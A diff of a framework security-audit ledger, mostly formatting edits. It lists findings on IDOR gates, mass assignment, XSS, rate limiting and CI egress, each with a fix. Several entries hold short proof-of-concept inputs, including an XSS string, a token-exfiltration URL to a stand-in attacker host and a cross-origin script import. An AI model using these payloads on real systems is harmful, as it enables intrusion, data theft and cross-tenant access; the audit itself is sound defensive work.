@@ -35,19 +35,22 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
   - `massAssignmentFactsForObject` derives each payload column via `propertyNameText(property.getNameNode())` **without** `resolveStaticComputed`, so a computed key whose bracket expression is anything but a string/numeric literal returns `undefined` and the property is `continue`d **before** any value verdict — fail-OPEN (the sibling spread path is deliberately fail-CLOSED).
   - **Exploit:** in a governed-table write, `db.update(accounts).set({ [input.field]: input.value })` lets a request choose **both** column and value (set `role`/`ownerId`/`balance` → privilege escalation / cross-tenant write) with zero KV438; the common `const col='role'; set({ [col]: input.role })` (type-checks fine) and a whitelisted-field PATCH helper are equally unanalyzed. Also bypasses the password and confidential-at-rest gates on the same loop.
   - **Verified:** worktree vitest via real `extractMassAssignmentFromProject` (5/5): literal `set({ role })` and `set({ ['role'] })` → 1 fact each; `set({ ['ro'+'le'] })`, `set({ [col] })`, `set({ [input.field]: input.value })` → **0 facts**.
-  - **Distinct:** bugz H3/H5 are VALUE-side name laundering on a *resolved* key; this skips the column-key lookup entirely (computed-member control-flow), a different function and root cause.
+  - **Distinct:** bugz H3/H5 are VALUE-side name laundering on a _resolved_ key; this skips the column-key lookup entirely (computed-member control-flow), a different function and root cause.
   - **Fix:** call `propertyNameText` with `resolveStaticComputed`, and when a key cannot be resolved fail **closed** (emit a fact / reject) like the spread path — never `continue`.
 
 - [ ] **H2 — RQB `with` relation tables are dropped from the query read set, so an owner-scoped related table read bypasses the KV414 IDOR gate (cross-tenant read).** `packages/drizzle/src/static/summaries.ts:805-826,214-238`; consumed at `packages/drizzle/src/static.ts:366-461`
   - `relationalQueryTableExpression` resolves only the **root** `db.query.<t>.findMany/findFirst` table and never walks the `with:` object, so related tables are absent from `fact.reads`; `scopeAuditsFromQueryFacts` only audits owner domains that appear in `reads`, so an owner table reached via `with` is never audited → no KV414. SPEC §10.6 promises "the JOIN is the declaration"; RQB makes the forgotten dependency representable and silent.
   - **Exploit:** `query('feed', { load: (_i, db) => db.query.posts.findMany({ with: { comments: {...} } }) })` where `comments` is `kovo({ owner:'authorId' })` compiles clean (scopeAudits=[]); `/_q/feed` returns every author's owner-scoped comments to any viewer. The byte-identical `leftJoin` form is correctly flagged KV414.
   - **Verified:** worktree (3/3) via `extractQueryFactsFromProject`/`extractOwnerAuditFromProject`: `with` form → `reads=['post']`, scopeAudits=[], diagnostics=[]; `leftJoin` control → `reads=['comment','post']`, KV414 `scope:'unknown'`.
-  - **Distinct:** not bugz H3/H5 (owner table present, operand laundered) or bugz-3 H1 (aliased callee erases all facts — here the query is fully recognized, only the relation read is dropped) or bugz-3 M4 (the *shape* extractor, KV435; this is the *read-set* extractor, KV414).
+  - **Distinct:** not bugz H3/H5 (owner table present, operand laundered) or bugz-3 H1 (aliased callee erases all facts — here the query is fully recognized, only the relation read is dropped) or bugz-3 M4 (the _shape_ extractor, KV435; this is the _read-set_ extractor, KV414).
   - **Fix:** walk the `with:` object in `relationalQueryTableExpression` and fold related tables into `tableExpressions`/reads (also restores KV407 invalidation for them).
 
 - [ ] **H3 — `compareAndSet` misreads the PGlite driver's affected-row count, so every successful KV429 CAS reports a stale-version conflict on the default driver.** `packages/drizzle/src/cas.ts:86`
   - `const affected = result.rowCount ?? result.rowsAffected ?? result.changes ?? 0` — drizzle-orm's PGlite session returns `{ rows, fields, affectedRows }` (named `affectedRows`), none of which the chain reads, so `affected===0` even when the UPDATE matched and committed → `CasConflict`.
-  - **Exploit:** the documented, KV429-compiler-mandated pattern `const cas = await compareAndSet(db.update(t).set({stock: sql\`stock-qty\`, ver: sql\`ver+1\`}).where(and(eq(id),eq(ver,prev)))); if (!cas.ok) throw new StaleVersionError()` on the default PGlite driver: the UPDATE commits (stock decremented) yet `cas.ok===false`, so the handler 409s — versioned/atomic writes are unusable (fails safe: rejects, doesn't corrupt). `compareAndSet` is a shipped public API and KV429 is a build-blocking gate that steers authors to it.
+  - **Exploit:** the documented, KV429-compiler-mandated compare-and-set pattern reports
+    `cas.ok === false` on the default PGlite driver even though the UPDATE committed, so the handler 409s
+    after decrementing stock. Versioned/atomic writes are unusable: fail-safe rejection, not corruption.
+    `compareAndSet` is a shipped public API and KV429 is a build-blocking gate that steers authors to it.
   - **Verified:** worktree (real `@electric-sql/pglite` 0.5.1 + drizzle-orm/pglite): a matching versioned UPDATE returns `{ok:false,conflict:true}` while the row was actually updated.
   - **Distinct:** no prior item touches `cas.ts`; bugz-3 M9 (invalidation) and the optimistic items are unrelated.
   - **Fix:** include `affectedRows` (and other driver count fields) in the coalescing chain, or read the count via a driver-agnostic path.
@@ -60,7 +63,7 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
   - `renderRouteDocumentResponse` decides "page render vs respond() outcome" purely by `status===200 && typeof body==='string' && content-type includes 'text/html'`; the `RouteResponseOutcome.routeResponse` marker + Content-Disposition are stripped by `routeOutcomeResponse` and never consulted, so an HTML file/stream outcome falls into document assembly.
   - **Exploit:** `respond.file('<h1>…</h1>', {contentType:'text/html', filename:'report.html'})` ships `<!doctype html>…<script>(inline loader)</script>…` with a CSP attached and the attachment disposition preserved — corrupted download / doubly-nested inline doc. No XSS (attachment downloads; inline-without-verifiedSafe is refused), so output corruption of a public API, not a breach.
   - **Verified:** worktree (2/2) — real `respond.file(text/html)` → body starts `<!doctype html>` and contains `<script`; `text/plain` control returns the bytes untouched.
-  - **Distinct:** inverse of bugz-3 M2 (which *lost* the no-store floor on these outcomes); this *adds* document wrapping.
+  - **Distinct:** inverse of bugz-3 M2 (which _lost_ the no-store floor on these outcomes); this _adds_ document wrapping.
   - **Fix:** thread the `routeResponse` marker (or Content-Disposition) into `renderRouteDocumentResponse` and pass non-document outcomes through regardless of content-type.
 
 - [ ] **M2 — Deferred-stream boundary-collision detection scans raw HTML source while the client matches tag-stripped `textContent`; adjacent attacker fields re-open the bugz-3 M3 hazard.** `packages/server/src/deferred-stream.ts:144-156,174-182` vs client at `:94,:192`
@@ -86,16 +89,17 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
 
 - [ ] **M5 — bugz-3 M4 residual: a secret column raw-projected via a `with`-relation `extras` escapes the KV435 backstop when the related secret table isn't in `reads`.** `packages/drizzle/src/static/query-shapes.ts:159-200,461-477`
   - The M4 fix over-approximates RQB `extras` to opaque paths so KV435 can fire, but `secretProjectionBackstopDiagnostics` only treats a path as secret-leaking when the secret table is in `tableExpressions` (root only, per H2) or the author's declared `reads:`. A secret reached through a `with` relation is in neither unless manually listed.
-  - **Exploit:** `db.query.posts.findMany({ with: { author: { extras: { leaked: sql\`${users.passwordHash}\`.as('leaked') } } } })` declared `reads:[posts]` → KV435 never fires → password hash reaches `/_q`.
+  - **Exploit:** a posts query that projects an author relation extra from `users.passwordHash` while declaring
+    only `reads:[posts]` never fires KV435, so the password hash reaches `/_q`.
   - **Verified:** worktree — `reads:[posts,users]` control fires KV435 ('author.leaked'); `reads:[posts]` leak form → no KV435.
   - **Distinct:** bugz-3 M4 fixed the case where the secret table is the queried/declared table; this is the related-table residual (shares the H2 read-set root cause on the secret-backstop side).
   - **Fix:** same as H2 — fold `with`-relation tables into the read set so the backstop sees the related secret table.
 
 - [ ] **M6 — Owner-principal IDOR gate (KV414) bypassed by binding `input.session.<ownerCol>` to a const — the bugz H5 carrier-root anchor is missing on the const-tracing recovery path.** `packages/drizzle/src/static/summaries.ts:1495-1530`
-  - `directPrivateScopeForExpression` anchors `.session/.guard/.tenant` to a proven request carrier root (the bugz H3/H5 fix), but the later recovery fallback `localBoundNonNullableSessionScope`→`directNonNullableSessionScopePath` matches a `session` *segment* anywhere in the const's initializer access path with **no** carrier-root check.
+  - `directPrivateScopeForExpression` anchors `.session/.guard/.tenant` to a proven request carrier root (the bugz H3/H5 fix), but the later recovery fallback `localBoundNonNullableSessionScope`→`directNonNullableSessionScopePath` matches a `session` _segment_ anywhere in the const's initializer access path with **no** carrier-root check.
   - **Exploit:** `async load(input: { session: { userId: string } }, db) { const uid = input.session.userId; return db.delete(orders).where(eq(orders.userId, uid)) }` on an owner table → no KV414; attacker sets any victim's id. The codebase's own H5 comment says this exact shape must be rejected.
   - **Verified:** worktree via `extractOwnerAuditFromProject` — const-bound `input.session.userId` write resolves to `scope:'session'` (no KV414); direct `input.session.userId` (post-H5) is correctly `args`.
-  - **Distinct:** new instance of the H3/H5 invariant on a *different* function (the const-tracing recovery fallback), not the direct member path H5 fixed.
+  - **Distinct:** new instance of the H3/H5 invariant on a _different_ function (the const-tracing recovery fallback), not the direct member path H5 fixed.
   - **Fix:** apply the `isPrivateScopeCarrierRoot` anchor in `directNonNullableSessionScopePath` too.
 
 - [ ] **M7 — Better-Auth secret classification (bugz-3 M6) omits plugin credential tables (twoFactor secret/backupCodes, oauthApplication clientSecret, oauthAccessToken access/refresh tokens).** `packages/better-auth/src/internal/contracts.ts:506-551`, emitter `packages/better-auth/src/internal.ts:1497-1523`
@@ -127,7 +131,7 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
   - **Fix:** derive the client IP from the RIGHT with a configurable trusted-hop count (or use the platform peer address); never the raw leftmost.
 
 - [ ] **M11 — The shared rate-limit store + per-check eviction params collapse other surfaces' window and maxKeys to the minimum (under-limits, not fail-safe).** `packages/server/src/app-load-shed.ts:217-277`
-  - `consumeRateLimit`→`evictExpiredRateBuckets` iterates **every** bucket in the store using the *currently-executing* check's `windowMs`/`maxKeys`. The all/mutation/query checks share `state.global` and `state.perIp`, so a short-window or small-maxKeys check purges the longer-window / larger-capacity buckets of other surfaces.
+  - `consumeRateLimit`→`evictExpiredRateBuckets` iterates **every** bucket in the store using the _currently-executing_ check's `windowMs`/`maxKeys`. The all/mutation/query checks share `state.global` and `state.perIp`, so a short-window or small-maxKeys check purges the longer-window / larger-capacity buckets of other surfaces.
   - **Exploit:** a plausible config (per-second query burst + per-minute global per-IP) — the 60s query budget is reset every ~1s by the all-check's 1s eviction, collapsing it to ~5 req/s instead of 5/min (under-limiting up to ~60×).
   - **Verified:** worktree (fake timers) — the 60s `queries.perIp{max:5}` budget is reset every ~1s by a 1s `perIp` window on the shared store.
   - **Distinct:** new; H1 above is client-IP trust, this is the eviction-params sharing.
@@ -137,11 +141,11 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
   - `req.clientIp` is attached only when a runner passes a `clientIp` resolver into `resolveLifecycleRequest`; only `app-mutation-request.ts` does so. The query channel and route-page render never thread it, so `per:'ip'` (advertised by the JSDoc for routes/queries/mutations) throws "cannot determine client IP" before the access decision.
   - **Exploit:** attaching the documented `guards.rateLimit({per:'ip'})` to a `query()` or `route()` page → 100% outage of that surface (framework 500). Fails closed; developer-reachable via an advertised config, not attacker-reachable.
   - **Verified:** worktree (3/3) — `runQuery` / route-page with `guards.rateLimit({per:'ip'})` rejects "cannot determine client IP"; the same guard on a mutation works.
-  - **Distinct:** bugz M3 was the *design* throw for anonymous clients; this is the per:'ip' guard being non-functional outside mutations.
+  - **Distinct:** bugz M3 was the _design_ throw for anonymous clients; this is the per:'ip' guard being non-functional outside mutations.
   - **Fix:** thread a `clientIp` resolver into the query and route-page lifecycle requests too.
 
 - [ ] **M13 — bugz-3 M9 residual: a `crossTable` change still carries child-space keys, and the render/delta path narrows by them and drops the changed parent rows → stale at the render stage.** `packages/server/src/mutation/targets.ts:85-178`, `packages/core/src/query-delta.ts:104-150`
-  - M9 over-invalidates only at *target selection* (`crossTable`→whole). But `mutationRegistryChangeRecords` still attaches resolved child-space `keys` to the crossTable change; `renderQueryChunks`→`buildAffectedKeysByDomain` includes those keys with no crossTable guard, and `renderQueryRerunChunk` ships a §9.1.1 delta keyed by them, so the changed parent rows (different key space) aren't in the delta → stale.
+  - M9 over-invalidates only at _target selection_ (`crossTable`→whole). But `mutationRegistryChangeRecords` still attaches resolved child-space `keys` to the crossTable change; `renderQueryChunks`→`buildAffectedKeysByDomain` includes those keys with no crossTable guard, and `renderQueryRerunChunk` ships a §9.1.1 delta keyed by them, so the changed parent rows (different key space) aren't in the delta → stale.
   - **Exploit:** relational `cart` domain (carts+cart_items); `removeCartItem` (writes cart_items) → crossTable change with `keys=[itemId]`; `cartList` (keyed by cart id) is selected whole but the shipped delta narrows by `itemId` and drops the cart rows → stale list. Gated on a delta-eligible relational-domain query.
   - **Verified:** worktree — real `mutationRegistryChangeRecords`+`renderQueryChunks`: crossTable change retains `keys`, the rerun chunk delta-narrows by child keys.
   - **Distinct:** M9 fixed target selection; this is the render/delta stage still narrowing (a different stage of the same fix).
@@ -158,7 +162,7 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
   - `table.tsx` is the only `@kovojs/ui` component that hand-builds HTML and returns objects branded `Symbol.for('kovo.renderedHtml')` (trusted, shipped verbatim). `tablePart()` and `Table.render` interpolate `${children ?? ''}` with no escaping, and hand-built children never pass through the server JSX child escaper. Leaf cells (`TableCell`) correctly escape.
   - **Exploit:** dynamic non-reactive text placed directly under a structural part — `<Table><TableBody>{buildSummary(req.query.q)}</TableBody></Table>` — where the value is a bare local (so `shouldEscapeStaticTextExpression` is false → no compiler escapeText, and the runtime never escapes structural children) renders `<img src=x onerror=…>` live. Narrow (text must sit directly under a structural part, not a cell) but a real XSS.
   - **Verified:** worktree — `TableRow.render({children:'<img src=x onerror=alert(1)>'})` output contains the raw payload (no `&lt;`); `TableCell` escapes.
-  - **Distinct:** no Table finding in prior ledgers; distinct from bugz-3 M7 (which *removed* double-escaping in other primitives and is correct).
+  - **Distinct:** no Table finding in prior ledgers; distinct from bugz-3 M7 (which _removed_ double-escaping in other primitives and is correct).
   - **Fix:** escape interpolated children in `tablePart`/`Table.render` (or route them through the runtime escaper); reserve the `renderedHtml` brand for genuinely framework-produced markup.
 
 ---
@@ -166,9 +170,9 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
 ## LOW
 
 - [ ] **L1 — Cookie-floor `unsafeCookie()` waiver is not bound to the attributes it weakens: one content-free waiver blanket-authorizes Secure+HttpOnly+SameSite downgrades and records an inaccurate audit fact.** `packages/server/src/cookies.ts:95-100,219-232`
-  - `applyCookieFloor` gates KV432 on `hasDowngrade && options.unsafe !== undefined` and records `options.unsafe.downgrade` verbatim, never cross-checking it against the actually-weakened attributes; `unsafeCookie()` only requires a non-empty `justification`. So `{downgrade:{}, justification:'…'}` waives *all* downgrades and the drained fact misstates what was weakened. Reachable only via deliberate use of the public escape on a credential cookie; the by-construction floor still holds without the escape.
+  - `applyCookieFloor` gates KV432 on `hasDowngrade && options.unsafe !== undefined` and records `options.unsafe.downgrade` verbatim, never cross-checking it against the actually-weakened attributes; `unsafeCookie()` only requires a non-empty `justification`. So `{downgrade:{}, justification:'…'}` waives _all_ downgrades and the drained fact misstates what was weakened. Reachable only via deliberate use of the public escape on a credential cookie; the by-construction floor still holds without the escape.
   - **Verified:** worktree — `session` cookie with `secure:false, httpOnly:false, sameSite:'none', unsafe:{downgrade:{}}` ships insecure in prod with no throw.
-  - **Distinct:** bugz-3 M1 was a *silent* (no-audit) bypass; here KV432 arms and a fact is produced, but the waiver is coarse and the fact inaccurate.
+  - **Distinct:** bugz-3 M1 was a _silent_ (no-audit) bypass; here KV432 arms and a fact is produced, but the waiver is coarse and the fact inaccurate.
   - **Fix:** require `unsafe.downgrade` to enumerate (and match) each weakened attribute; reject a waiver that doesn't cover the actual downgrade.
 
 - [ ] **L2 — `SecretValue.equals`/`RedactedValue.equals` (advertised constant-time) leak operand length via variable loop count and silently return false for byte-equal non-string operands.** `packages/core/src/secret.ts:105-112,296-303`
@@ -191,7 +195,7 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
 
 - [ ] **L5 — The replay idempotency fingerprint embeds the per-render-rotating masked CSRF token on the enhanced wire path; `canonicalReplayInput`'s neutralization is dead code.** `packages/server/src/replay.ts:270-297`, `packages/server/src/mutation-wire.ts:333`
   - `replayFingerprint` returns the precomputed `requestFingerprint` verbatim (from `canonicalRequestFingerprint`, no CSRF neutralization) and only calls `canonicalReplayInput` (which rewrites the csrf field) when it is absent. Because the masked token rotates per mint, identical bodies fingerprint differently across renders.
-  - **Exploit:** an app using a *stable* app-chosen `Kovo-Idem` across renders + two renders of the same form submitting the identical body → spurious 409 instead of an idempotent replay. NOT default-reachable (the default client mints a fresh idem per submit). Fails safe.
+  - **Exploit:** an app using a _stable_ app-chosen `Kovo-Idem` across renders + two renders of the same form submitting the identical body → spurious 409 instead of an idempotent replay. NOT default-reachable (the default client mints a fresh idem per submit). Fails safe.
   - **Verified:** worktree (2/2) — identical body, two masked tokens → divergent fingerprints.
   - **Distinct:** bugz-3 L3 was the FormData→`{}` collapse; this is the dead CSRF-neutralization on the precomputed path.
   - **Fix:** neutralize the csrf field in `canonicalRequestFingerprint` too (or strip it before fingerprinting on the wire path).
@@ -204,33 +208,33 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
 
 - [ ] **L7 — The module stream-text renderer import bypasses the dynamic-import URL allowlist enforced by every other dynamic-import sink.** `packages/browser/src/stream-text.ts:173-194`
   - `StreamTextBuffer.render()` imports a `data-stream-renderer` ref via `this.importModule(parsed.url)` with no `assertAllowedKovoDynamicImportUrl` (handlers / query-bindings call it). Its only protection is a pre-wrapped `importModule`, which `installKovoLoader` provides only when `allowedClientModuleUrls` is set.
-  - **Exploit:** an attacker-controlled `data-stream-renderer` attribute (surviving safeRichHtml's `data-*` passthrough) + the *module* loader configured with a raw `import()` → cross-origin module import/exec. **Gated behind a non-default loader** (the default inline loader wraps `im` with the `ki` allowlist), so default-config apps are safe.
+  - **Exploit:** an attacker-controlled `data-stream-renderer` attribute (surviving safeRichHtml's `data-*` passthrough) + the _module_ loader configured with a raw `import()` → cross-origin module import/exec. **Gated behind a non-default loader** (the default inline loader wraps `im` with the `ki` allowlist), so default-config apps are safe.
   - **Verified:** worktree — `new StreamTextBuffer({importModule:raw}).render()` imports `https://evil.example/x.js`; the sibling sinks' assert throws on it.
-  - **Distinct:** bugz-2 M4 was the inline guard being too *permissive*; this is a missing explicit gate in the module stream-text path.
+  - **Distinct:** bugz-2 M4 was the inline guard being too _permissive_; this is a missing explicit gate in the module stream-text path.
   - **Fix:** call `assertAllowedKovoDynamicImportUrl` in `StreamTextBuffer.render()` like the sibling sinks.
 
-- [ ] **L8 — The CI egress floor classifies any `127.`-prefixed *hostname* as loopback, allowing exfil to attacker-owned `127.x.*` domains under deny-all.** `scripts/egress-floor-hook.cjs:27-36`
-  - `isLoopbackHost` does `normalized.startsWith('127.')` on the host *name*, not an in-`127.0.0.0/8` address check, so `127.0.0.1.attacker.com` (resolving to the attacker) is treated as loopback and allowed.
+- [ ] **L8 — The CI egress floor classifies any `127.`-prefixed _hostname_ as loopback, allowing exfil to attacker-owned `127.x.*` domains under deny-all.** `scripts/egress-floor-hook.cjs:27-36`
+  - `isLoopbackHost` does `normalized.startsWith('127.')` on the host _name_, not an in-`127.0.0.0/8` address check, so `127.0.0.1.attacker.com` (resolving to the attacker) is treated as loopback and allowed.
   - **Exploit:** a malicious build/publish dependency (the floor's threat model) connects/resolves to `http://127.0.0.1.attacker.com/?d=<token>` and exfiltrates under deny-all. Repo CI tooling, not shipped framework code.
   - **Verified:** worktree — `isLoopbackHost('127.0.0.1.attacker.com') === true`.
   - **Distinct:** bugz H2 is the runtime egress address[0]; bugz-3 L7 is this hook's DNS/UDP protocol coverage; this is the host-name prefix classification.
   - **Fix:** parse the host as an IP and check membership in `127.0.0.0/8` (and `::1`); never string-prefix the name.
 
 - [ ] **L9 — The `_headers` sidecar keys the per-document security floor at `/index.html` (never `/`) with no `/*` document catch-all, so pretty-URL/homepage requests can ship without the header floor.** `packages/server/src/static-export-output.ts:308-334`
-  - The dynamic presets apply `documentStaticHeaders` to every document via a `/(.*)` catch-all; the sidecar instead emits one stanza per document keyed to its emitted file path (`/index.html`, `/about/index.html`) and no `/*` fallback. On hosts that match `_headers` against the *request* path (Cloudflare Pages), a request to `/` or `/about/` matches no rule → no X-Frame-Options/COOP/Permissions-Policy/Referrer-Policy.
+  - The dynamic presets apply `documentStaticHeaders` to every document via a `/(.*)` catch-all; the sidecar instead emits one stanza per document keyed to its emitted file path (`/index.html`, `/about/index.html`) and no `/*` fallback. On hosts that match `_headers` against the _request_ path (Cloudflare Pages), a request to `/` or `/about/` matches no rule → no X-Frame-Options/COOP/Permissions-Policy/Referrer-Policy.
   - **Verified:** source-proof at HEAD — root artifact path is `/index.html`, pushed verbatim; only `/c/*`+`/assets/*` extra stanzas, no `/*` document fallback.
-  - **Distinct:** bugz M4 = whether a sidecar is emitted; bugz-3 L8 = the immutable-asset stanzas; this is the document stanza *key* and missing catch-all.
+  - **Distinct:** bugz M4 = whether a sidecar is emitted; bugz-3 L8 = the immutable-asset stanzas; this is the document stanza _key_ and missing catch-all.
   - **Fix:** emit a `/*` document stanza carrying `documentStaticHeaders` (and/or key root document to `/`).
 
 - [ ] **L10 — bugz-3 L10 residual: the CSS-value guard doesn't cover `style.create`/`keyframes`, nor token/step NAMES — CSS rule injection escapes the guard.** `packages/style/src/engine.ts:629-640,700-726,524-540`
-  - `assertCssValueSafe` (rejects `<>{};\\`+controls) is wired into only `defineVars`/`createTheme` and only for the *value*. `style.create()`/`createAtomicStyles()` serialize values into identical `__rules[].rule` strings with no guard, and `keyframes()` serializes both the value and the step NAME, and `defineVars` doesn't guard the token NAME.
+  - `assertCssValueSafe` (rejects `<>{};\\`+controls) is wired into only `defineVars`/`createTheme` and only for the _value_. `style.create()`/`createAtomicStyles()` serialize values into identical `__rules[].rule` strings with no guard, and `keyframes()` serializes both the value and the step NAME, and `defineVars` doesn't guard the token NAME.
   - **Exploit:** `createAtomicStyles({a:{color:'red}html{background:url(//evil)'}})` injects a sibling rule; the same value can carry `</style>` if inlined. No default-config breach (these are build-time `@kovojs/style/internal` consumed with author-trusted literals).
   - **Verified:** worktree — `defineVars`/`createTheme` value THROWS (guard fires); `createAtomicStyles`/`createKeyframes`/token-name forms produce injection-bearing output.
-  - **Distinct:** bugz-3 L10 fixed the `defineVars`/`createTheme` *value*; this covers the other functions + the NAME path.
+  - **Distinct:** bugz-3 L10 fixed the `defineVars`/`createTheme` _value_; this covers the other functions + the NAME path.
   - **Fix:** route all rule-serializing functions (and token/step names) through `assertCssValueSafe`/an identifier validator.
 
 - [ ] **L11 — The capability download route serves private bearer-token files with no `Cache-Control` header (the declared `cache:'private'` is enforced only in dev/CI and never emitted).** `packages/server/src/capability-route.ts:302-311,329`
-  - `createStorageDownloadEndpoint` hand-builds a 200 with an ETag and no Cache-Control; the only consumer of `cache:'private'`, `assertEndpointResponsePosture`, is a dev/CI-only assertion that *throws* on mismatch — it never injects the header. So in production a shared cache can heuristically store the token-keyed private download.
+  - `createStorageDownloadEndpoint` hand-builds a 200 with an ETag and no Cache-Control; the only consumer of `cache:'private'`, `assertEndpointResponsePosture`, is a dev/CI-only assertion that _throws_ on mismatch — it never injects the header. So in production a shared cache can heuristically store the token-keyed private download.
   - **Verified:** worktree (2/2) — the download Response carries an ETag and no Cache-Control.
   - **Distinct:** bugz-3 M2 was the route/document path; this is the capability endpoint's hand-built response.
   - **Fix:** emit `Cache-Control: private, no-store` from the capability download handler (don't rely on the dev-only posture verifier).
@@ -246,7 +250,7 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
   - `validateFrameworkSecret` treats any non-array object as `{keys:[...]}` or `{current,previous}`; a `SigningKeyRing` instance (a first-class public `SigningSecret` form) has no enumerable `keys`, so it falls to reading `value.current` (undefined) → fatal `csrf.secret.current must be a string`.
   - **Exploit:** `createApp({ csrf: { secret: kmsBackedRing } })` is refused boot in production though the ring signs/verifies fine. Fails closed (bricks a legit deploy); not attacker-reachable.
   - **Verified:** worktree — a `{currentKeyId,sign,verify}` ring → fatal `must be a string` boot error.
-  - **Distinct:** FS1/FS2 are missing validation; this is *incorrect* validation false-positiving on a valid input.
+  - **Distinct:** FS1/FS2 are missing validation; this is _incorrect_ validation false-positiving on a valid input.
   - **Fix:** detect a `SigningKeyRing` (duck-type `currentKeyId`/`sign`/`verify`) before the `{current}`/`{keys}` parse and accept it.
 
 - [ ] **L14 — Optimistic queue: a timed-out mutation that later settles applies stale server truth (and cross-tab broadcasts it) out of order, clobbering a later committed mutation.** `packages/browser/src/mutation-optimistic.ts:108-153`
